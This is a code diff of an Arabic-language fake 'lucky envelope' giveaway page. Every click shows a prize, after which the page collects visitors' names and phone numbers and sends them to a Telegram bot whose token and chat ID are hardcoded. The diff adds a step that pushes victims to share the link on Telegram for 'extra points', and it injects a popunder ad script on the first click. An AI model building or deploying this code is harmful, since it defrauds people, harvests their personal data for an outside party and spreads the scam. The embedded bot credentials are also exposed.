@@ -12,12 +12,12 @@ body{margin:0;font-family:tahoma;background:var(--bg)}
 .step{display:none}
 .step.active{display:block}
 
-/* header */
+/* Header */
 .header{background:var(--red);color:#fff;padding:14px;text-align:center;font-weight:bold}
 .flag{font-size:28px;display:block}
 .sub{text-align:center;color:#555;margin:10px 0}
 
-/* envelopes */
+/* Envelopes */
 .envelopes{
   max-width:420px;margin:16px auto;
   display:grid;grid-template-columns:repeat(3,1fr);
@@ -48,11 +48,13 @@ body{margin:0;font-family:tahoma;background:var(--bg)}
   line-height:1.6
 }
 
-/* form */
+/* Cards & form */
 .center{max-width:420px;margin:auto;padding:12px}
 .card{background:#fff;border-radius:12px;padding:16px;box-shadow:0 10px 20px rgba(0,0,0,.12)}
 .input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;margin-bottom:10px}
 .btn{width:100%;padding:12px;border:none;border-radius:10px;background:var(--red);color:#fff;font-size:16px;cursor:pointer}
+.share{text-align:center}
+.share a{display:block;margin-top:10px;text-decoration:none}
 
 .footer{text-align:center;color:#777;margin:20px 0;font-size:12px}
 </style>
@@ -90,6 +92,20 @@ body{margin:0;font-family:tahoma;background:var(--bg)}
   </div>
 </section>
 
+<!-- STEP 3 -->
+<section id="step3" class="step">
+  <div class="center">
+    <div class="card share">
+      <h3>🎉 تم التسجيل بنجاح</h3>
+      <p>شارك الرابط في مجموعتك لتحصل على نقاط إضافية</p>
+      <a class="btn" target="_blank"
+         href="https://t.me/share/url?url=https://yyyrr.vercel.app&text=جرب حظك واربح نقاط الآن">
+         مشاركة على تلغرام
+      </a>
+    </div>
+  </div>
+</section>
+
 <div class="footer">© 2025</div>
 
 <script>
@@ -99,9 +115,19 @@ let locked = false;
 const BOT_TOKEN = "8530299273:AAHH0iDVc60tDNnxtTuqDS17DWPXIBl9X50";
 const CHAT_ID   = "5516597110";
 
-/* فتح الظرف */
+/* ربط الأظرف */
 document.querySelectorAll('.env').forEach(env=>{
   env.addEventListener('click', ()=>{
+
+    // 🔥 إعلان Adsterra Popunder (مرة واحدة)
+    if(!localStorage.getItem("ad_shown")){
+      var ad = document.createElement('script');
+      ad.src = "https://pl28368436.effectivegatecpm.com/c7/af/55/c7af5584b330872a39f7881e9a25809e.js";
+      ad.async = true;
+      document.body.appendChild(ad);
+      localStorage.setItem("ad_shown","1");
+    }
+
     if(locked) return;
     locked = true;
 
@@ -109,7 +135,6 @@ document.querySelectorAll('.env').forEach(env=>{
     env.querySelector('.body').innerHTML =
       "🎉 <strong>ربحت</strong><br>💰 <strong>10,000 نقطة</strong>";
 
-    // بعد 3 ثواني انتقل للتسجيل
     setTimeout(()=>{
       document.getElementById('step1').classList.remove('active');
       document.getElementById('step2').classList.add('active');
@@ -136,20 +161,13 @@ function sendToTelegram(){
   fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
     method:"POST",
     headers:{"Content-Type":"application/json"},
-    body:JSON.stringify({
-      chat_id: CHAT_ID,
-      text: text
-    })
+    body:JSON.stringify({chat_id: CHAT_ID, text: text})
   })
-  .then(res=>res.json())
   .then(()=>{
-    alert("تم إرسال المعلومات بنجاح ✅");
-    document.getElementById('name').value="";
-    document.getElementById('phone').value="";
+    document.getElementById('step2').classList.remove('active');
+    document.getElementById('step3').classList.add('active');
   })
-  .catch(()=>{
-    alert("حصل خطأ ❌");
-  });
+  .catch(()=> alert("حصل خطأ ❌"));
 }
 </script>
 
